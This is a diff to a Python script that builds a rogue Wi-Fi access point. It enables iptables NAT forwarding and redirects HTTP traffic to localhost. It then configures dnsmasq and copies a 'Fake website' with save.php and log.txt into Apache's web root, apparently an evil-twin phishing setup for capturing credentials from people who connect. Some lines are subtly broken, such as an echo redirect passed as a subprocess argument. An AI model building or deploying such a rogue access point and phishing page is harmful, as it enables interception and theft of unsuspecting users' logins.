@@ -49,10 +49,10 @@ with open('hostapd.conf', 'w') as f:
 # Configure iptables to reroute traffic
 subprocess.call(['ifconfig', 'wlan0mon', 'up', '192.168.1.1', 'netmask', '255.255.255.0'])
 subprocess.call(['route', 'add', '-net', '192.168.1.0', 'netmask', '255.255.255.0', 'gw', '192.168.1.1'])
-#subprocess.call(['iptables', '--table', 'nat', '--append', 'POSTROUTING', '--out-interface', 'eth0', '-j', 'MASQUERADE'])
-#subprocess.call(['iptables', '--append', 'FORWARD', '--in-interface', 'wlan0mon', '-j', 'ACCEPT'])
+subprocess.call(['iptables', '--table', 'nat', '--append', 'POSTROUTING', '--out-interface', 'eth0', '-j', 'MASQUERADE'])
+subprocess.call(['iptables', '--append', 'FORWARD', '--in-interface', 'wlan0mon', '-j', 'ACCEPT'])
 subprocess.call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
-subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', 'localhost:80'])
+subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '127.0.0.1:80'])
 subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])
 #subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-p', 'tcp', '-d', '192.168.1.125', '--dport', '80', '-j', 'SNAT', '--to-source', '192.168.1.1'])
 
@@ -62,7 +62,7 @@ subprocess.call(['rm', 'dnsmasq.conf'])
 
 with open('dnsmasq.conf', 'w') as f:
     f.write('interface=wlan0mon\n')
-    f.write('dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0, 2h\n')
+    f.write('dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n')
     f.write('dhcp-option=3,192.168.1.1\n')
     f.write('dhcp-option=6,192.168.1.1\n')
     f.write('server=8.8.8.8\n')
@@ -71,3 +71,14 @@ with open('dnsmasq.conf', 'w') as f:
     f.write('listen-address=127.0.0.1\n')
 
 subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'])
+
+# Move Fake website into the directory that Apache hosts
+subprocess.call(['cp', './website/index.html', '/var/www/html/'])
+subprocess.call(['cp', './website/save.php', '/var/www/html/'])
+subprocess.call(['cp', '-r','./website/images', '/var/www/html/'])
+subprocess.call(['cp', '-r','./website/include', '/var/www/html/'])
+subprocess.call(['cp', './website/log.txt', '/var/www/html/'])
+
+# Start the Apache sever to run fake website
+subprocess.call(['/etc/init.d/apache2', 'start'])
+
